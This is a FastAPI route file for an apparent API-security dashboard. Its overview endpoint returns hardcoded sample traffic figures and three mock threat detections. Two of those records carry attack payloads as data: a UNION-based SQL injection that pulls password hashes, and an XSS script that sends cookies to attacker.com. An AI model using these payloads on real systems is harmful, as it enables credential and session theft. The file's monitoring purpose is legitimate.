from fastapi import APIRouter, Depends
from sqlalchemy.ext.asyncio import AsyncSession
from typing import Dict, Any

from backend.app.database.session import get_db
from backend.app.schemas.schemas import ApiSecurityAnalysisOut
from backend.app.core.security import get_current_user_payload, TokenPayload

router = APIRouter(prefix="/api-security", tags=["API Security"])

@router.get("/overview", response_model=ApiSecurityAnalysisOut)
async def get_api_security_overview(
    db: AsyncSession = Depends(get_db),
    payload: TokenPayload = Depends(get_current_user_payload)
):
    top_endpoints = [
        {"path": "/api/v1/auth/login", "method": "POST", "requests": 8420, "anomalies": 312, "status_breakdown": {"200": 8108, "401": 312}},
        {"path": "/api/v1/users/profile", "method": "GET", "requests": 5210, "anomalies": 14, "status_breakdown": {"200": 5196, "403": 14}},
        {"path": "/api/v1/orders/checkout", "method": "POST", "requests": 3400, "anomalies": 88, "status_breakdown": {"200": 3312, "422": 88}},
        {"path": "/admin/config", "method": "PUT", "requests": 420, "anomalies": 45, "status_breakdown": {"403": 420, "200": 0}}
    ]
    
    anomalies = [
        {
            "id": "API-PAYLOAD-01",
            "endpoint": "/api/v1/auth/login",
            "threat_type": "SQL Injection",
            "confidence": 94.5,
            "detected_pattern": "' UNION SELECT username, password_hash FROM users--",
            "client_ip": "203.0.113.88",
            "timestamp": "2026-08-19 18:40:02"
        },
        {
            "id": "API-PAYLOAD-02",
            "endpoint": "/api/v1/users/search",
            "threat_type": "Cross-Site Scripting (XSS)",
            "confidence": 92.1,
            "detected_pattern": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "client_ip": "198.51.100.12",
            "timestamp": "2026-08-19 18:22:14"
        },
        {
            "id": "API-AUTH-03",
            "endpoint": "/api/v1/auth/login",
            "threat_type": "Credential Stuffing",
            "confidence": 96.8,
            "detected_pattern": "450 failed authentication requests/min with varying username dictionaries.",
            "client_ip": "203.0.113.45",
            "timestamp": "2026-08-19 18:15:00"
        }
    ]

    return ApiSecurityAnalysisOut(
        total_api_requests=17450,
        auth_failure_count=371,
        sqli_attempts_count=140,
        xss_attempts_count=82,
        rate_limit_violations=215,
        top_targeted_endpoints=top_endpoints,
        recent_payload_anomalies=anomalies
    )
